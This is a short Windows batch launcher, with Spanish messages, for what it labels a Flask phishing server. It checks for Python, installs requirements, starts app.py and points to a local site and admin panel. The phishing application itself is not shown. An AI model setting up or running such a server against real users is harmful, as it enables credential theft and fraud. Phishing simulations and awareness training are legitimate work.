@echo off
echo ====================================
echo  SERVIDOR FLASK DE PHISHING
echo ====================================
echo.
echo Verificando Python...
python --version
if %errorlevel% neq 0 (
    echo ERROR: Python no esta instalado o no esta en PATH
    pause
    exit /b 1
)

echo.
echo Instalando dependencias...
pip install -r requirements.txt

echo.
echo Iniciando servidor Flask...
echo.
echo Accede a: http://localhost:5000
echo Panel Admin: http://localhost:5000/admin
echo.
echo Presiona Ctrl+C para detener el servidor
echo.

python app.py

pause
